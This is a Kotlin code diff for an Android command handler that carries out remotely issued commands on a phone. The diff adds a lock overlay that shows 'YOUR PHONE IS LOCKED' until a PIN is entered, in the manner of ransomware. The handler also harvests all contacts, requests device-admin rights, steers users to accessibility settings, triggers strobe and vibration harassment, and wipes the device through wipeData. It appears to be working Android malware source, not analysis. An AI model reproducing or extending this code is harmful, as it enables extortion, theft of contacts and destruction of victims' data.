@@ -5,6 +5,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
 import android.media.MediaPlayer
@@ -14,18 +15,24 @@ import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
 import android.provider.Settings
-import android.util.Base64
 import android.util.Log
+import org.json.JSONArray
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 
 object NativeCommandHandler {
 
     private const val TAG = "NativeCmdHandler"
+    private var mediaPlayer: MediaPlayer? = null
 
+    // ==========================================
+    // ===== MAIN EXECUTE =====
+    // ==========================================
     fun execute(context: Context, command: String, extra: String): JSONObject {
+        Log.d(TAG, "🎯 Execute: $command (extra=$extra)")
+
         return try {
             when (command) {
+                // ===== PING =====
                 "ping" -> {
                     JSONObject().apply {
                         put("ok", true)
@@ -34,44 +41,41 @@ object NativeCommandHandler {
                     }
                 }
 
+                // ===== FLASHLIGHT =====
                 "flash_strobe" -> toggleFlash(context, true)
                 "stop_strobe" -> toggleFlash(context, false)
 
+                // ===== VIBRATE =====
                 "vibrate_loop" -> vibrateLoop(context)
                 "stop_vibrate" -> stopVibrate(context)
 
+                // ===== FORCE OPEN =====
                 "force_open" -> forceOpen(context)
 
+                // ===== OPEN URL =====
                 "open_url" -> openUrl(context, extra)
 
-                "hard_lock" -> hardLock(context)
+                // ===== LOCK (OVERLAY) =====
+                "hard_lock" -> hardLockOverlay(context, extra)
+                "unlock" -> unlockOverlay()
 
-                "unlock" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "unlock_not_supported")
-                    }
-                }
-
+                // ===== DEVICE ADMIN =====
                 "is_device_admin" -> {
                     JSONObject().apply {
                         put("ok", true)
                         put("is_admin", isDeviceAdmin(context))
                     }
                 }
-
                 "request_device_admin" -> {
                     requestDeviceAdmin(context)
                     JSONObject().apply {
                         put("ok", true)
-                        put("message", "Dialog dibuka")
+                        put("message", "Dialog admin dibuka")
                     }
                 }
 
+                // ===== SCREEN CAPTURE =====
                 "get_screen" -> {
-                    // Screen capture butuh MediaProjection (user consent)
-                    // Native service tidak bisa capture tanpa consent.
-                    // Fallback: capture pakai main thread Activity kalau tersedia
                     JSONObject().apply {
                         put("ok", false)
                         put("error", "screen_capture_requires_activity")
@@ -79,10 +83,12 @@ object NativeCommandHandler {
                     }
                 }
 
+                // ===== CAMERA =====
                 "take_photo" -> {
                     JSONObject().apply {
                         put("ok", false)
                         put("error", "camera_requires_activity")
+                        put("message", "Camera butuh Activity")
                     }
                 }
 
@@ -99,10 +105,11 @@ object NativeCommandHandler {
                     }
                 }
 
+                // ===== AUDIO =====
                 "play_audio" -> playAudio(context, extra)
-
                 "stop_audio" -> stopAudio()
 
+                // ===== WALLPAPER =====
                 "set_wallpaper" -> {
                     JSONObject().apply {
                         put("ok", false)
@@ -110,13 +117,16 @@ object NativeCommandHandler {
                     }
                 }
 
+                // ===== CONTACTS =====
                 "get_contacts" -> getContacts(context)
 
+                // ===== ACCESSIBILITY =====
                 "open_accessibility" -> {
                     openAccessibilitySettings(context)
                     JSONObject().apply { put("ok", true) }
                 }
 
+                // ===== PROTECTION =====
                 "enable_protection" -> {
                     JSONObject().apply {
                         put("ok", false)
@@ -131,9 +141,12 @@ object NativeCommandHandler {
                     }
                 }
 
+                // ===== FACTORY RESET =====
                 "factory_reset" -> factoryReset(context)
 
+                // ===== UNKNOWN =====
                 else -> {
+                    Log.w(TAG, "Unknown command: $command")
                     JSONObject().apply {
                         put("ok", false)
                         put("error", "unknown_command")
@@ -158,6 +171,7 @@ object NativeCommandHandler {
         return try {
             val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
             var cameraId: String? = null
+
             for (id in camManager.cameraIdList) {
                 try {
                     val chars = camManager.getCameraCharacteristics(id)
@@ -167,15 +181,20 @@ object NativeCommandHandler {
                         cameraId = id
                         break
                     }
-                } catch (e: Exception) {}
+                } catch (e: Exception) {
+                    Log.w(TAG, "Camera $id error: ${e.message}")
+                }
             }
+
             if (cameraId == null) {
                 return JSONObject().apply {
                     put("ok", false)
                     put("error", "no_flash")
                 }
             }
+
             camManager.setTorchMode(cameraId, on)
+            Log.d(TAG, "Flash $on on camera $cameraId")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -190,7 +209,8 @@ object NativeCommandHandler {
     // ==========================================
     private fun getVibrator(context: Context): Vibrator {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
+            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE)
+                    as VibratorManager
             vm.defaultVibrator
         } else {
             @Suppress("DEPRECATION")
@@ -202,12 +222,15 @@ object NativeCommandHandler {
         return try {
             val vibrator = getVibrator(context)
             val pattern = longArrayOf(0, 500, 500)
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
             } else {
                 @Suppress("DEPRECATION")
                 vibrator.vibrate(pattern, 0)
             }
+
+            Log.d(TAG, "Vibrate loop started")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -220,6 +243,7 @@ object NativeCommandHandler {
     private fun stopVibrate(context: Context): JSONObject {
         return try {
             getVibrator(context).cancel()
+            Log.d(TAG, "Vibrate stopped")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -236,12 +260,14 @@ object NativeCommandHandler {
         return try {
             val intent = context.packageManager
                 .getLaunchIntentForPackage(context.packageName)
+
             if (intent != null) {
                 intent.addFlags(
                     Intent.FLAG_ACTIVITY_NEW_TASK or
                     Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                 )
                 context.startActivity(intent)
+                Log.d(TAG, "Force open app")
                 JSONObject().apply { put("ok", true) }
             } else {
                 JSONObject().apply {
@@ -271,6 +297,7 @@ object NativeCommandHandler {
             val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
+            Log.d(TAG, "Open URL: $url")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -281,36 +308,60 @@ object NativeCommandHandler {
     }
 
     // ==========================================
-    // ===== LOCK / ADMIN =====
+    // ===== LOCK (OVERLAY) =====
     // ==========================================
-    private fun isDeviceAdmin(context: Context): Boolean {
-        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
-        return dpm.isAdminActive(admin)
-    }
-
-    private fun hardLock(context: Context): JSONObject {
+    private fun hardLockOverlay(context: Context, extra: String): JSONObject {
         return try {
-            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
-            if (dpm.isAdminActive(admin)) {
-                dpm.lockNow()
-                JSONObject().apply {
-                    put("ok", true)
-                    put("locked", true)
-                }
-            } else {
-                JSONObject().apply {
-                    put("ok", false)
-                    put("error", "device_admin_not_active")
-                }
+            // Parse extra: "message|pin"
+            val parts = extra.split("|")
+            val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
+                ?: "YOUR PHONE IS LOCKED"
+            val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
+                ?: "1234"
+
+            Log.d(TAG, "🔒 Launch lock overlay: message=$message, pin=${pin.take(2)}***")
+
+            // Launch LockOverlayActivity (bukan dpm.lockNow())
+            LockOverlayActivity.launch(context, message, pin)
+
+            JSONObject().apply {
+                put("ok", true)
+                put("locked", true)
+                put("message", message)
             }
         } catch (e: Exception) {
+            Log.e(TAG, "hardLockOverlay error", e)
             JSONObject().apply {
                 put("ok", false)
                 put("error", e.message ?: "lock_error")
             }
         }
+    }
+
+    private fun unlockOverlay(): JSONObject {
+        return try {
+            Log.d(TAG, "🔓 Unlock overlay")
+            LockOverlayManager.unlock()
+            JSONObject().apply {
+                put("ok", true)
+                put("unlocked", true)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "unlock_error")
+            }
+        }
+    }
+
+    // ==========================================
+    // ===== DEVICE ADMIN =====
+    // ==========================================
+    private fun isDeviceAdmin(context: Context): Boolean {
+        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
+                as DevicePolicyManager
+        val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
+        return dpm.isAdminActive(admin)
     }
 
     private fun requestDeviceAdmin(context: Context) {
@@ -324,6 +375,7 @@ object NativeCommandHandler {
             )
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
+            Log.d(TAG, "Device admin dialog requested")
         } catch (e: Exception) {
             Log.e(TAG, "requestDeviceAdmin error", e)
         }
@@ -332,8 +384,6 @@ object NativeCommandHandler {
     // ==========================================
     // ===== AUDIO =====
     // ==========================================
-    private var mediaPlayer: MediaPlayer? = null
-
     private fun playAudio(context: Context, url: String): JSONObject {
         if (url.isEmpty()) {
             return JSONObject().apply {
@@ -345,8 +395,14 @@ object NativeCommandHandler {
             mediaPlayer?.release()
             mediaPlayer = MediaPlayer().apply {
                 setDataSource(url)
-                setOnPreparedListener { start() }
-                setOnErrorListener { _, _, _ -> true }
+                setOnPreparedListener {
+                    Log.d(TAG, "🎵 Audio playing")
+                    start()
+                }
+                setOnErrorListener { _, _, _ ->
+                    Log.e(TAG, "Audio error")
+                    true
+                }
                 prepareAsync()
             }
             JSONObject().apply { put("ok", true) }
@@ -363,6 +419,7 @@ object NativeCommandHandler {
             mediaPlayer?.stop()
             mediaPlayer?.release()
             mediaPlayer = null
+            Log.d(TAG, "🎵 Audio stopped")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply { put("ok", true) }
@@ -374,11 +431,12 @@ object NativeCommandHandler {
     // ==========================================
     private fun getContacts(context: Context): JSONObject {
         return try {
-            val contacts = mutableListOf<Map<String, String>>()
+            val contactsList = mutableListOf<Map<String, String>>()
             val cursor = context.contentResolver.query(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null,
             )
+
             cursor?.use {
                 val nameIdx = it.getColumnIndex(
                     android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
@@ -386,21 +444,37 @@ object NativeCommandHandler {
                 val phoneIdx = it.getColumnIndex(
                     android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                 )
+
                 while (it.moveToNext()) {
                     val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
                     val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
-                    contacts.add(mapOf("name" to (name ?: ""), "phone" to (phone ?: "")))
+                    contactsList.add(mapOf(
+                        "name" to (name ?: ""),
+                        "phone" to (phone ?: ""),
+                    ))
                 }
             }
+
+            Log.d(TAG, "📇 Contacts: ${contactsList.size}")
+
+            // Convert to JSONArray
+            val jsonArray = JSONArray()
+            for (c in contactsList) {
+                jsonArray.put(JSONObject(c))
+            }
+
             JSONObject().apply {
                 put("ok", true)
-                put("contacts", org.json.JSONArray(contacts))
-                put("count", contacts.size)
+                put("contacts", jsonArray)
+                put("count", contactsList.size)
             }
         } catch (e: Exception) {
+            Log.e(TAG, "getContacts error", e)
             JSONObject().apply {
                 put("ok", false)
                 put("error", e.message ?: "contacts_error")
+                put("contacts", JSONArray())
+                put("count", 0)
             }
         }
     }
@@ -413,6 +487,7 @@ object NativeCommandHandler {
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
+            Log.d(TAG, "Accessibility settings opened")
         } catch (e: Exception) {
             Log.e(TAG, "openAccessibility error", e)
         }
@@ -423,10 +498,13 @@ object NativeCommandHandler {
     // ==========================================
     private fun factoryReset(context: Context): JSONObject {
         return try {
-            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
+                    as DevicePolicyManager
             val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
+
             if (dpm.isAdminActive(admin)) {
                 dpm.wipeData(0)
+                Log.d(TAG, "🔥 Factory reset triggered")
                 JSONObject().apply { put("ok", true) }
             } else {
                 JSONObject().apply {
